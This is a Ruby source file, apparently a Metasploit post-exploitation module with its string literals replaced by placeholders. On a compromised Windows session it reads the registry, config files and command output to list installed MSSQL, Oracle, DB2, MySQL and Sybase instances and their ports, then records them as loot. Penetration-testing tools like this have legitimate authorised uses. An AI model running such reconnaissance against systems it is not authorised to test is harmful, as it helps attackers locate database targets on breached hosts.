require <str> require <str> require <str> class Metasploit3 < Msf :: Post include Msf :: Post :: File include Msf :: Post :: Windows :: Registry include Msf :: Auxiliary :: Report def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ <str> ] , <str> = > [ <str> ] ) ) end def run results = [ ] print_status ( <str> sysinfo [ <str> ] <str> ) if check_mssql results += enumerate_mssql end if check_oracle results += enumerate_oracle end if check_db2 results += enumerate_db2 end if check_mysql results += enumerate_mysql end if check_sybase results += enumerate_sybase end if results . empty? print_status ( <str> ) return end print_status ( <str> ) tbl = Rex :: Ui :: Text :: Table . new ( <str> = > <str> , <str> = > <int> , <str> = > [ <str> , <str> , <str> , <str> ] ) results . each { | r | report_service ( <str> = > session . sock . peerhost , <str> = > r [ <int> ] , <str> = > r [ <int> ] , <str> = > <str> r [ <int> ] <str> r [ <int> ] <str> ) tbl << r } print_line ( tbl . to_s ) p = store_loot ( <str> , <str> , session , tbl . to_s , <str> , <str> ) print_status ( <str> p <str> ) end def check_mssql key = <str> if registry_enumkeys ( key ) . include? ( <str> ) print_status ( <str> ) return true end return false rescue return false end def check_oracle key = <str> if registry_enumkeys ( key ) . include? ( <str> ) print_status ( <str> ) return true elsif registry_enumkeys ( key ) . include? ( <str> ) print_status ( <str> ) return true elsif registry_enumkeys ( key ) . include? ( <str> ) print_status ( <str> ) return true end return false rescue return false end def check_db2 key = <str> if registry_enumkeys ( key ) . include? ( <str> ) print_status ( <str> ) return true end return false rescue return false end def check_mysql key = <str> if registry_enumkeys ( key ) . include? ( <str> ) print_status ( <str> ) return true end return false rescue return false end def check_sybase key = <str> if registry_enumkeys ( key ) . include? ( <str> ) print_status ( <str> ) return true elsif registry_enumkeys ( key ) . include? ( <str> ) print_status ( <str> ) return true end return false rescue return false end def enumerate_mssql results = [ ] key = <str> instances = registry_enumvals ( key ) if not instances . nil? and not instances . empty? instances . each do | i | tcpkey = <str> registry_getvaldata ( key , i ) <str> tcpport = registry_getvaldata ( tcpkey , <str> ) print_good ( <str> registry_getvaldata ( key , i ) <str> tcpport <str> ) results << [ <str> , <str> registry_getvaldata ( key , i ) <str> tcpport <str> , <str> , tcpport ] end end return results rescue print_error ( <str> ) return results || [ ] end def enumerate_oracle results = [ ] found_key = false basekey_set = [ <str> , <str> ] basekey_set . each do | basekey | next if found_key instances = registry_enumkeys ( basekey ) if instances . nil? or instances . empty? next else found_key = true end instances . each do | i | if basekey . include? <str> val_ORACLE_SID = registry_getvaldata ( basekey , <str> ) val_ORACLE_HOME = registry_getvaldata ( basekey , <str> ) else key = <str> basekey <str> i <str> val_ORACLE_SID = registry_getvaldata ( key , <str> ) val_ORACLE_HOME = registry_getvaldata ( key , <str> ) end if not exist? ( val_ORACLE_HOME + <str> ) print_error ( <str> val_ORACLE_SID <str> ) next end data_TNSNAMES = read_file ( val_ORACLE_HOME + <str> ) if data_TNSNAMES =~ <str> port = $1 print_good ( <str> val_ORACLE_SID <str> port <str> ) results << [ <str> , <str> val_ORACLE_SID <str> port <str> , <str> , port ] else print_error ( <str> val_ORACLE_SID <str> ) end end end if not found_key print_error ( <str> ) end return results rescue print_error ( <str> ) return results || [ ] end def enumerate_mysql results = [ ] basekey = <str> instances = registry_enumkeys ( basekey ) if instances . nil? or instances . empty? return results end instances . each do | i | key = <str> basekey <str> i <str> val_location = registry_getvaldata ( key , <str> ) data = find_mysql_conf ( val_location ) if data and data =~ <str> port = $1 print_good ( <str> port <str> ) results << [ <str> , <str> port <str> , <str> , port ] else print_error ( <str> ) end end return results rescue print_error ( <str> ) return results || [ ] end def enumerate_sybase basekey = <str> instance = registry_getvaldata ( basekey , <str> ) location = registry_getvaldata ( basekey , <str> ) results = [ ] if not exist? ( location + <str> ) print_error ( <str> ) return results end data = read_file ( location + <str> ) if data =~ <str> instance <str> segment = $1 else print_error ( <str> ) return results end if segment =~ <str> port = $1 else print_error ( <str> ) return results end print_good ( <str> instance <str> port <str> ) results << [ <str> , <str> instance <str> port <str> , <str> , port ] return results rescue print_error ( <str> ) return results || [ ] end def enumerate_db2 results = [ ] cmd_i = cmd_exec ( <str> , <str> ) cmd_p = cmd_exec ( <str> , <str> ) if cmd_p =~ <str> port = $1 else print_error ( <str> ) return results end windir = session . sys . config . getenv ( <str> ) getfile = session . fs . file . search ( windir + <str> , <str> , recurse = true , timeout = - <int> ) data = nil getfile . each do | file | if exist? ( <str> file [ <str> ] <str> file [ <str> ] <str> ) data = read_file ( <str> file [ <str> ] <str> file [ <str> ] <str> ) break if not data . nil? end end if data and data =~ <str> port <str> port_t = $1 else print_error ( <str> ) return results end cmd_i . split ( <str> ) . compact . each do | line | stripped = line . strip print_good ( <str> stripped <str> port_t <str> ) results << [ <str> , <str> stripped <str> port_t <str> , <str> , port_t ] end return results rescue print_error ( <str> ) return results || [ ] end def find_mysql_conf ( val_location ) data = nil if exist? ( val_location + <str> ) data = read_file ( val_location + <str> ) elsif exist? ( val_location + <str> ) data = read_file ( val_location + <str> ) else sysdriv = session . sys . config . getenv ( <str> ) getfile = session . fs . file . search ( sysdriv + <str> , <str> , recurse = true , timeout = - <int> ) getfile . each do | file | if exist? ( <str> file [ <str> ] <str> file [ <str> ] <str> ) data = read_file ( <str> file [ <str> ] <str> file [ <str> ] <str> ) break end end end return data end end 
